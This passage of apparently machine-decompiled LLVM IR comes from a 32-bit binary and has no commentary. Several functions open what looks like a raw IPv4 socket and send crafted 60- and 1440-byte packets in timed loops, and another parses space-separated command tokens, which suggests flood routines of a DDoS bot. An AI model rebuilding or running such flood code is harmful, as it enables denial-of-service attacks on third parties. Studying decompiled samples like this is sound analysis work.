dec_label_pc_a0e8:                                ; preds = %dec_label_pc_a0bc, %dec_label_pc_a0e0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_9fcc, %dec_label_pc_a0e8
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_9fcc ], [ 0, %dec_label_pc_a0e8 ]
  %v1_a0f4 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_9f54

dec_label_pc_a100:                                ; preds = %dec_label_pc_9d1c
  ret i32 %v1_9d5c

; uselistorder directives
  uselistorder i32 %v1_a048, { 1, 0 }
  uselistorder i32 %v0_a00c, { 1, 0 }
  uselistorder i32 %v3_9ff4, { 1, 0 }
  uselistorder i32 %v1_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc4, { 1, 0 }
  uselistorder i32 %v0_9fac, { 1, 0 }
  uselistorder i32 %v3_9fa0, { 1, 0 }
  uselistorder i32 %v1_9f94, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 2 }
  uselistorder i32 %v3_9f88, { 1, 0 }
  uselistorder i8* %v4_9fc0, { 1, 0 }
  uselistorder i32 %v4_9f2c, { 3, 4, 1, 6, 0, 2, 5, 8, 7 }
  uselistorder i32 %v1_9f28, { 1, 0 }
  uselistorder i32 %v3_9f1c, { 1, 0 }
  uselistorder i8* %tmp42, { 1, 2, 0 }
  uselistorder i32 %v2_9e1c, { 15, 1, 16, 3, 5, 17, 0, 2, 4, 6, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32 %v2_9dec, { 1, 0, 2 }
  uselistorder i32 %v2_9d4c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 6, 7, 8, 11, 12, 17, 18, 13, 14, 15, 16, 19, 21, 22, 20, 23, 30, 24, 26, 27, 25, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a0f0, { 1, 0 }
  uselistorder label %dec_label_pc_a0e8, { 1, 0 }
  uselistorder label %dec_label_pc_9fcc, { 1, 0 }
  uselistorder label %dec_label_pc_9dbc, { 1, 0 }
  uselistorder label %dec_label_pc_9d98, { 1, 0 }
}

define i32 @function_a110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a110:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a114 = load i32, i32* @fp, align 4
  store i32 %v3_a114, i32* %stack_var_-16, align 4
  store i32 41244, i32* %stack_var_-4, align 4
  %v13_a114 = ptrtoint i32* %stack_var_-16 to i32
  %v2_a118 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a118, i32* @fp, align 4
  %v2_a134 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_a134, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15574.126 to i32), i32* @r1, align 4
  store i32 80, i32* @r2, align 4
  %v0_a148 = call i32 @function_ef60()
  %v2_a160 = call i32 @function_ce30(i32* null)
  %v1_a170 = call i32 @function_83d8(i32 %arg2)
  %v2_a178 = icmp eq i32 %v1_a170, 0
  br i1 %v2_a178, label %dec_label_pc_a180, label %dec_label_pc_a6a4

dec_label_pc_a180:                                ; preds = %dec_label_pc_a110
  %v8_a188 = icmp sgt i32 %arg3, 2
  br i1 %v8_a188, label %dec_label_pc_a1a4, label %dec_label_pc_a18c

dec_label_pc_a18c:                                ; preds = %dec_label_pc_a180
  store i32 %arg2, i32* @r2, align 4
  %v3_a198 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_155c4.128 to i32))
  %v1_a1a0 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_a1a4

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a180, %dec_label_pc_a18c
  %v3_a1b0 = call i32 @function_fc4c(i32 2, i32 3, i32 255)
  %v1_a1c0 = icmp slt i32 %v3_a1b0, 0
  br i1 %v1_a1c0, label %dec_label_pc_a1c8, label %dec_label_pc_a224.preheader

dec_label_pc_a1c8:                                ; preds = %dec_label_pc_a1a4
  %v1_a1cc = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_a224.preheader

dec_label_pc_a224.preheader:                      ; preds = %dec_label_pc_a1a4, %dec_label_pc_a1c8
  %v2_a1f0 = add i32 %v13_a114, -248
  %v2_a208 = add i32 %v13_a114, -60
  br label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a224.preheader, %dec_label_pc_a1dc
  %storemerge1516 = phi i32 [ 0, %dec_label_pc_a224.preheader ], [ %v1_a21c, %dec_label_pc_a1dc ]
  %v3_a1e8 = mul nuw nsw i32 %storemerge1516, 4
  %v2_a1f4 = add i32 %v2_a1f0, %v3_a1e8
  %v1_a1f8 = inttoptr i32 %v2_a1f4 to i32*
  %v2_a1f8 = load i32, i32* %v1_a1f8, align 4
  %v2_a20c = add i32 %v2_a208, %storemerge1516
  %v1_a214 = trunc i32 %v2_a1f8 to i8
  %v3_a214 = inttoptr i32 %v2_a20c to i8*
  store i8 %v1_a214, i8* %v3_a214, align 1
  %v1_a21c = add nuw nsw i32 %storemerge1516, 1
  %v7_a22c = icmp slt i32 %v1_a21c, 20
  br i1 %v7_a22c, label %dec_label_pc_a1dc, label %dec_label_pc_a230

dec_label_pc_a230:                                ; preds = %dec_label_pc_a1dc
  %v1_a234 = add i32 %arg4, 4
  %v1_a238 = inttoptr i32 %v1_a234 to i32*
  %v2_a238 = load i32, i32* %v1_a238, align 4
  %v2_a244 = call i32 @function_9c5c(i32 %arg2, i32 %v2_a238)
  %v1_a254 = add i32 %arg4, 12
  %v1_a258 = inttoptr i32 %v1_a254 to i32*
  %v2_a258 = load i32, i32* %v1_a258, align 4
  %v1_a260 = inttoptr i32 %v2_a258 to i8*
  %v2_a260 = call i32 @function_10868(i8* %v1_a260)
  store i32 %arg2, i32* @r2, align 4
  %v3_a284 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_155ec.130 to i32))
  store i8 69, i8* %stack_var_-116, align 1
  %v1_a3b4 = add i32 %arg4, 8
  %v1_a3b8 = inttoptr i32 %v1_a3b4 to i32*
  %v2_a3b8 = load i32, i32* %v1_a3b8, align 4
  %v1_a3c0 = inttoptr i32 %v2_a3b8 to i8*
  %v2_a3c0 = call i32 @function_10868(i8* %v1_a3c0)
  %v3_a3cc = urem i32 %v2_a3c0, 65536
  %v1_a3d4 = call i32 @function_f604(i32 %v3_a3cc)
  %v2_a5c0 = ptrtoint i32* %stack_var_-96 to i32
  %v2_a5c8 = ptrtoint i32* %stack_var_-156 to i32
  %v2_a5e0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_a5e8 = ptrtoint i32* %stack_var_-136 to i32
  %v2_a610 = bitcast i32* %stack_var_-168 to i8*
  %v2_a62c = ptrtoint i32* %stack_var_-184 to i32
  %v6_a650 = bitcast i8* %stack_var_-116 to i32*
  %v2_a678 = add i32 %v2_a260, %v2_a160
  br label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a694, %dec_label_pc_a230
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_a230 ], [ %v1_a698, %dec_label_pc_a694 ]
  %v0_a3e0 = call i32 @function_10364()
  %v2_a3f4 = load i32, i32* %v1_a3b8, align 4
  %v1_a3fc = inttoptr i32 %v2_a3f4 to i8*
  %v2_a3fc = call i32 @function_10868(i8* %v1_a3fc)
  %v2_a404 = icmp eq i32 %v2_a3fc, 0
  br i1 %v2_a404, label %dec_label_pc_a40c, label %dec_label_pc_a418

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3e0
  %v0_a40c = call i32 @function_10364()
  br label %dec_label_pc_a418

dec_label_pc_a418:                                ; preds = %dec_label_pc_a3e0, %dec_label_pc_a40c
  %v0_a418 = call i32 @function_8548()
  %v1_a440 = call i32 @function_f604(i32 60)
  %v0_a454 = call i32 @function_10364()
  %v3_a494 = urem i32 %v0_a3e0, 65536
  store i32 %v3_a494, i32* %stack_var_-96, align 4
  %v0_a4bc = call i32 @function_10364()
  store i32 2, i32* %stack_var_-184, align 4
  %v3_a510 = call i32 @function_8cc4(i8* nonnull %stack_var_-116, i32 20)
  %v0_a524 = call i32 @function_10364()
  store i32 %v0_a418, i32* %stack_var_-168, align 4
  %v1_a5a8 = call i32 @function_f604(i32 40)
  store i32 20, i32* @r2, align 4
  %v3_a5d8 = call i32 @function_ef50(i32 %v2_a5c0, i32 %v2_a5c8, i32 20)
  store i32 20, i32* @r2, align 4
  %v3_a5f8 = call i32 @function_ef50(i32 %v2_a5e0, i32 %v2_a5e8, i32 20)
  %v3_a610 = call i32 @function_8cc4(i8* %v2_a610, i32 52)
  %v7_a650 = call i32 @function_fbe8(i32 %v3_a1b0, i32* %v6_a650, i32 60, i32 0, i32 %v2_a62c, i32 16)
  %tmp = icmp ult i32 %stack_var_-56.0, 50
  br i1 %tmp, label %dec_label_pc_a694, label %dec_label_pc_a660

dec_label_pc_a660:                                ; preds = %dec_label_pc_a418
  %v2_a664 = call i32 @function_ce30(i32* null)
  %v3_a67c = icmp ult i32 %v2_a664, %v2_a678
  br i1 %v3_a67c, label %dec_label_pc_a68c, label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %dec_label_pc_a660
  %v1_a688 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_a68c

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a660, %dec_label_pc_a684
  br label %dec_label_pc_a694

dec_label_pc_a694:                                ; preds = %dec_label_pc_a418, %dec_label_pc_a68c
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_a418 ], [ 0, %dec_label_pc_a68c ]
  %v1_a698 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_a3e0

dec_label_pc_a6a4:                                ; preds = %dec_label_pc_a110
  ret i32 %v1_a170

; uselistorder directives
  uselistorder i32 %stack_var_-56.0, { 1, 0 }
  uselistorder i32 %storemerge1516, { 2, 0, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-116, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a694, { 1, 0 }
  uselistorder label %dec_label_pc_a68c, { 1, 0 }
  uselistorder label %dec_label_pc_a418, { 1, 0 }
  uselistorder label %dec_label_pc_a1dc, { 1, 0 }
  uselistorder label %dec_label_pc_a224.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a1a4, { 1, 0 }
}

define i32 @function_a6b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a6b8:
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 42692, i32* %stack_var_-4, align 4
  %v2_a6c0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a6c0, i32* @fp, align 4
  %v2_a6e8 = call i32 @function_ce30(i32* null)
  %v1_a6f8 = call i32 @function_83d8(i32 %arg2)
  %v2_a700 = icmp eq i32 %v1_a6f8, 0
  br i1 %v2_a700, label %dec_label_pc_a708, label %dec_label_pc_ab8c

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6b8
  %v8_a710 = icmp sgt i32 %arg3, 1
  br i1 %v8_a710, label %dec_label_pc_a72c, label %dec_label_pc_a714

dec_label_pc_a714:                                ; preds = %dec_label_pc_a708
  store i32 %arg2, i32* @r2, align 4
  %v3_a720 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_15604.132 to i32))
  %v1_a728 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a708, %dec_label_pc_a714
  %v1_a730 = add i32 %arg4, 8
  %v1_a734 = inttoptr i32 %v1_a730 to i32*
  %v2_a734 = load i32, i32* %v1_a734, align 4
  %v1_a73c = inttoptr i32 %v2_a734 to i8*
  %v2_a73c = call i32 @function_10868(i8* %v1_a73c)
  %v3_a754 = call i32 @function_fc4c(i32 2, i32 3, i32 255)
  %v1_a764 = icmp slt i32 %v3_a754, 0
  br i1 %v1_a764, label %dec_label_pc_a76c, label %dec_label_pc_a774

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a72c
  %v1_a770 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_a774

dec_label_pc_a774:                                ; preds = %dec_label_pc_a72c, %dec_label_pc_a76c
  %v2_a778 = call i32 @function_ce30(i32* null)
  store i32 %v2_a778, i32* @r4, align 4
  %v0_a780 = call i32 @function_cd2c()
  %v0_a788 = load i32, i32* @r4, align 4
  %v2_a788 = xor i32 %v0_a788, %v0_a780
  %v1_a790 = call i32 @function_10508(i32 %v2_a788)
  %v0_a794 = call i32 @function_10364()
  %v2_a7a0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 1400, i32* @r2, align 4
  %v2_a7b0 = bitcast i32* %stack_var_-72 to i8*
  %v3_a7b0 = call i32 @function_ef70(i8* %v2_a7b0, i32 %v0_a794)
  %v1_a7b8 = add i32 %arg4, 4
  %v1_a7bc = inttoptr i32 %v1_a7b8 to i32*
  %v2_a7bc = load i32, i32* %v1_a7bc, align 4
  %v2_a7c8 = call i32 @function_9c5c(i32 %arg2, i32 %v2_a7bc)
  store i32 %arg2, i32* @r2, align 4
  %v3_a7ec = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_15628.134 to i32))
  %v2_aaa0 = ptrtoint i32* %stack_var_-92 to i32
  %v2_aaa8 = ptrtoint i32* %stack_var_-152 to i32
  %v2_aac8 = ptrtoint i32* %stack_var_-132 to i32
  %v2_aaf0 = bitcast i32* %stack_var_-164 to i8*
  %v2_ab0c = ptrtoint i32* %stack_var_-180 to i32
  %v6_ab30 = bitcast i8* %stack_var_-112 to i32*
  %v2_ab58 = add i32 %v2_a73c, %v2_a6e8
  br label %dec_label_pc_a7f0

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_a774
  %stack_var_-44.0 = phi i32 [ %tmp21, %dec_label_pc_a774 ], [ %v1_ab70, %dec_label_pc_ab6c ]
  %v0_a7f0 = call i32 @function_8548()
  store i8 69, i8* %stack_var_-112, align 1
  %v1_a860 = call i32 @function_f604(i32 1440)
  %v0_a874 = call i32 @function_10364()
  %v0_a8cc = call i32 @function_10364()
  %v3_a8d8 = urem i32 %v0_a8cc, 65536
  store i32 %v3_a8d8, i32* %stack_var_-92, align 4
  %v0_a8e8 = call i32 @function_10364()
  %v0_a904 = call i32 @function_10364()
  %v0_a910 = call i32 @function_10364()
  store i32 2, i32* %stack_var_-180, align 4
  %v3_aa20 = call i32 @function_8cc4(i8* nonnull %stack_var_-112, i32 20)
  %v3_aa40 = call i32 @function_8cc4(i8* nonnull %stack_var_-112, i32 40)
  store i32 %v0_a7f0, i32* %stack_var_-164, align 4
  %v1_aa88 = call i32 @function_f604(i32 1420)
  store i32 20, i32* @r2, align 4
  %v3_aab8 = call i32 @function_ef50(i32 %v2_aaa0, i32 %v2_aaa8, i32 20)
  store i32 1400, i32* @r2, align 4
  %v3_aad8 = call i32 @function_ef50(i32 %v2_a7a0, i32 %v2_aac8, i32 1400)
  %v3_aaf0 = call i32 @function_8cc4(i8* %v2_aaf0, i32 1432)
  %v7_ab30 = call i32 @function_fbe8(i32 %v3_a754, i32* %v6_ab30, i32 1440, i32 0, i32 %v2_ab0c, i32 16)
  %tmp = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp, label %dec_label_pc_ab6c, label %dec_label_pc_ab40

dec_label_pc_ab40:                                ; preds = %dec_label_pc_a7f0
  %v2_ab44 = call i32 @function_ce30(i32* null)
  %v3_ab5c = icmp ult i32 %v2_ab44, %v2_ab58
  br i1 %v3_ab5c, label %dec_label_pc_ab64, label %dec_label_pc_ab7c

dec_label_pc_ab64:                                ; preds = %dec_label_pc_ab40
  br label %dec_label_pc_ab6c

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_a7f0, %dec_label_pc_ab64
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_a7f0 ], [ 0, %dec_label_pc_ab64 ]
  %v1_ab70 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_a7f0

dec_label_pc_ab7c:                                ; preds = %dec_label_pc_ab40
  %v1_ab80 = call i32 @function_cbe4(i32 %v3_a754)
  %v1_ab88 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_ab8c

dec_label_pc_ab8c:                                ; preds = %dec_label_pc_a6b8, %dec_label_pc_ab7c
  %v12_ab90 = phi i32 [ %v1_a6f8, %dec_label_pc_a6b8 ], [ %v1_ab88, %dec_label_pc_ab7c ]
  ret i32 %v12_ab90

; uselistorder directives
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-112, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i32 ()* @function_8548, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_9c5c, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_83d8, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ab8c, { 1, 0 }
  uselistorder label %dec_label_pc_ab6c, { 1, 0 }
  uselistorder label %dec_label_pc_a774, { 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
}

define i32 @function_b84c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b84c:
  %stack_var_-4 = alloca i32, align 4
  store i32 47192, i32* %stack_var_-4, align 4
  %v2_b854 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b854, i32* @fp, align 4
  %v2_b86c = load i32, i32* @global_var_1abf4.187, align 4
  store i32 %v2_b86c, i32* @r2, align 4
  %v3_b87c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_15df4.208 to i32))
  %v2_b884 = load i32, i32* @global_var_1ad08.185, align 4
  store i32 %v2_b884, i32* @r2, align 4
  %v3_b898 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_15e04.213 to i32))
  %v2_b8a0 = load i32, i32* @global_var_1abf4.187, align 4
  store i32 %v2_b8a0, i32* @r2, align 4
  %v3_b8b0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_15e14.215 to i32))
  ret i32 %v3_b8b0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_b8d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b8d4:
  %stack_var_-4 = alloca i32, align 4
  store i32 47328, i32* %stack_var_-4, align 4
  %v2_b8dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b8dc, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v3_b8fc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_15e1c.217 to i32))
  ret i32 %v3_b8fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_b90c(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_b90c:
  %stack_var_-40 = alloca i8, align 1
  %stack_var_-52 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 47384, i32* %stack_var_-4, align 4
  %v2_b914 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b914, i32* @fp, align 4
  store i8* %arg3, i8** %stack_var_-52, align 4
  br label %dec_label_pc_b95c.preheader

dec_label_pc_b944:                                ; preds = %dec_label_pc_b974
  %v1_b948 = add i32 %.pre, 1
  %v5_b94c = inttoptr i32 %v1_b948 to i8*
  %v1_b954 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_b95c

dec_label_pc_b95c:                                ; preds = %dec_label_pc_b95c.preheader, %dec_label_pc_b944
  %stack_var_-36.0 = phi i32 [ %v1_b954, %dec_label_pc_b944 ], [ %stack_var_-36.117, %dec_label_pc_b95c.preheader ]
  %stack_var_-28.0 = phi i8* [ %v5_b94c, %dec_label_pc_b944 ], [ %stack_var_-28.118, %dec_label_pc_b95c.preheader ]
  %v3_b960 = load i8*, i8** %stack_var_-52, align 4
  %v4_b960 = ptrtoint i8* %v3_b960 to i32
  store i32 %v4_b960, i32* @r0, align 4
  %v0_b964 = call i32 @function_f030()
  %v3_b96c = icmp ult i32 %stack_var_-36.0, %v0_b964
  %.pre = ptrtoint i8* %stack_var_-28.0 to i32
  br i1 %v3_b96c, label %dec_label_pc_b974, label %dec_label_pc_b984

dec_label_pc_b974:                                ; preds = %dec_label_pc_b95c
  %v2_b978 = load i8, i8* %stack_var_-28.0, align 1
  %v7_b97c = icmp eq i8 %v2_b978, 32
  br i1 %v7_b97c, label %dec_label_pc_b984, label %dec_label_pc_b944

dec_label_pc_b984:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_b974
  %v1_b988 = add i32 %.pre, 1
  %v3_b994 = load i8*, i8** %stack_var_-52, align 4
  %v4_b994 = ptrtoint i8* %v3_b994 to i32
  store i32 %v4_b994, i32* @r0, align 4
  %v0_b998 = call i32 @function_f030()
  %v9_b9a0 = icmp eq i32 %stack_var_-36.0, %v0_b998
  br i1 %v9_b9a0, label %dec_label_pc_bc24, label %dec_label_pc_b9a8

dec_label_pc_b9a8:                                ; preds = %dec_label_pc_b984
  %v5_b98c = inttoptr i32 %v1_b988 to i8*
  %v1_b9ac = add nuw nsw i32 %storemerge719, 1
  %v7_b9bc = icmp slt i32 %v1_b9ac, 5
  br i1 %v7_b9bc, label %dec_label_pc_b95c.preheader, label %dec_label_pc_b9d8

dec_label_pc_b95c.preheader:                      ; preds = %dec_label_pc_b90c, %dec_label_pc_b9a8
  %storemerge719 = phi i32 [ 0, %dec_label_pc_b90c ], [ %v1_b9ac, %dec_label_pc_b9a8 ]
  %stack_var_-28.118 = phi i8* [ %arg3, %dec_label_pc_b90c ], [ %v5_b98c, %dec_label_pc_b9a8 ]
  %stack_var_-36.117 = phi i32 [ 0, %dec_label_pc_b90c ], [ %stack_var_-36.0, %dec_label_pc_b9a8 ]
  br label %dec_label_pc_b95c

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9f0
  %v1_b9d0 = add i32 %storemerge8, 1
  br label %dec_label_pc_b9d8

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9a8, %dec_label_pc_b9cc
  %storemerge8 = phi i32 [ %v1_b9d0, %dec_label_pc_b9cc ], [ 0, %dec_label_pc_b9a8 ]
  store i32 %storemerge8, i32* @r4, align 4
  store i32 %v1_b988, i32* @r0, align 4
  %v0_b9e0 = call i32 @function_f030()
  %v0_b9e8 = load i32, i32* @r4, align 4
  %v3_b9e8 = icmp ult i32 %v0_b9e8, %v0_b9e0
  br i1 %v3_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge

dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge:    ; preds = %dec_label_pc_b9d8
  %.pre25 = add i32 %storemerge8, %v1_b988
  %.pre26 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_ba0c

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9d8
  %v2_b9fc = add i32 %storemerge8, %v1_b988
  %v1_ba00 = inttoptr i32 %v2_b9fc to i8*
  %v2_ba00 = load i8, i8* %v1_ba00, align 1
  %v7_ba04 = icmp eq i8 %v2_ba00, 32
  br i1 %v7_ba04, label %dec_label_pc_ba0c, label %dec_label_pc_b9cc

dec_label_pc_ba0c:                                ; preds = %dec_label_pc_b9f0, %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge
  %v3_ba20.pre-phi = phi i8* [ %.pre26, %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge ], [ %v1_ba00, %dec_label_pc_b9f0 ]
  store i8 0, i8* %v3_ba20.pre-phi, align 1
  %v2_ba28 = load i32, i32* @global_var_1abf4.187, align 4
  %v4_ba34 = call i32 @function_f464(i8* %v5_b98c, i32 %v2_ba28)
  %v2_ba3c = icmp eq i32 %v4_ba34, 0
  br i1 %v2_ba3c, label %dec_label_pc_ba44, label %dec_label_pc_bc24

dec_label_pc_ba44:                                ; preds = %dec_label_pc_ba0c
  %v2_ba48 = load i32, i32* @global_var_1847c.35, align 4
  %v2_ba4c = icmp eq i32 %v2_ba48, 0
  br i1 %v2_ba4c, label %dec_label_pc_ba54, label %dec_label_pc_bc24

dec_label_pc_ba54:                                ; preds = %dec_label_pc_ba44
  %v3_ba54 = load i8*, i8** %stack_var_-52, align 4
  br label %dec_label_pc_ba88.preheader

dec_label_pc_ba70:                                ; preds = %dec_label_pc_baa0
  %v1_ba74 = add i32 %.pre27, 1
  %v5_ba78 = inttoptr i32 %v1_ba74 to i8*
  %v1_ba80 = add i32 %stack_var_-36.2, 1
  br label %dec_label_pc_ba88

dec_label_pc_ba88:                                ; preds = %dec_label_pc_ba88.preheader, %dec_label_pc_ba70
  %stack_var_-36.2 = phi i32 [ %v1_ba80, %dec_label_pc_ba70 ], [ %stack_var_-36.314, %dec_label_pc_ba88.preheader ]
  %stack_var_-28.2 = phi i8* [ %v5_ba78, %dec_label_pc_ba70 ], [ %stack_var_-28.315, %dec_label_pc_ba88.preheader ]
  %v3_ba8c = load i8*, i8** %stack_var_-52, align 4
  %v4_ba8c = ptrtoint i8* %v3_ba8c to i32
  store i32 %v4_ba8c, i32* @r0, align 4
  %v0_ba90 = call i32 @function_f030()
  %v3_ba98 = icmp ult i32 %stack_var_-36.2, %v0_ba90
  %.pre27 = ptrtoint i8* %stack_var_-28.2 to i32
  br i1 %v3_ba98, label %dec_label_pc_baa0, label %dec_label_pc_bab0

dec_label_pc_baa0:                                ; preds = %dec_label_pc_ba88
  %v2_baa4 = load i8, i8* %stack_var_-28.2, align 1
  %v7_baa8 = icmp eq i8 %v2_baa4, 32
  br i1 %v7_baa8, label %dec_label_pc_bab0, label %dec_label_pc_ba70

dec_label_pc_bab0:                                ; preds = %dec_label_pc_ba88, %dec_label_pc_baa0
  %v1_bab4 = add i32 %.pre27, 1
  %v3_bac0 = load i8*, i8** %stack_var_-52, align 4
  %v4_bac0 = ptrtoint i8* %v3_bac0 to i32
  store i32 %v4_bac0, i32* @r0, align 4
  %v0_bac4 = call i32 @function_f030()
  %v9_bacc = icmp eq i32 %stack_var_-36.2, %v0_bac4
  br i1 %v9_bacc, label %dec_label_pc_bc24, label %dec_label_pc_bad4

dec_label_pc_bad4:                                ; preds = %dec_label_pc_bab0
  %v5_bab8 = inttoptr i32 %v1_bab4 to i8*
  %v1_bad8 = add nuw nsw i32 %storemerge916, 1
  %v7_bae8 = icmp slt i32 %v1_bad8, 3
  br i1 %v7_bae8, label %dec_label_pc_ba88.preheader, label %dec_label_pc_bb04

dec_label_pc_ba88.preheader:                      ; preds = %dec_label_pc_ba54, %dec_label_pc_bad4
  %storemerge916 = phi i32 [ 0, %dec_label_pc_ba54 ], [ %v1_bad8, %dec_label_pc_bad4 ]
  %stack_var_-28.315 = phi i8* [ %v3_ba54, %dec_label_pc_ba54 ], [ %v5_bab8, %dec_label_pc_bad4 ]
  %stack_var_-36.314 = phi i32 [ 0, %dec_label_pc_ba54 ], [ %stack_var_-36.2, %dec_label_pc_bad4 ]
  br label %dec_label_pc_ba88

dec_label_pc_baf8:                                ; preds = %dec_label_pc_bb1c
  %v1_bafc = add i32 %storemerge10, 1
  br label %dec_label_pc_bb04

dec_label_pc_bb04:                                ; preds = %dec_label_pc_bad4, %dec_label_pc_baf8
  %storemerge10 = phi i32 [ %v1_bafc, %dec_label_pc_baf8 ], [ 0, %dec_label_pc_bad4 ]
  store i32 %storemerge10, i32* @r4, align 4
  store i32 %v1_bab4, i32* @r0, align 4
  %v0_bb0c = call i32 @function_f030()
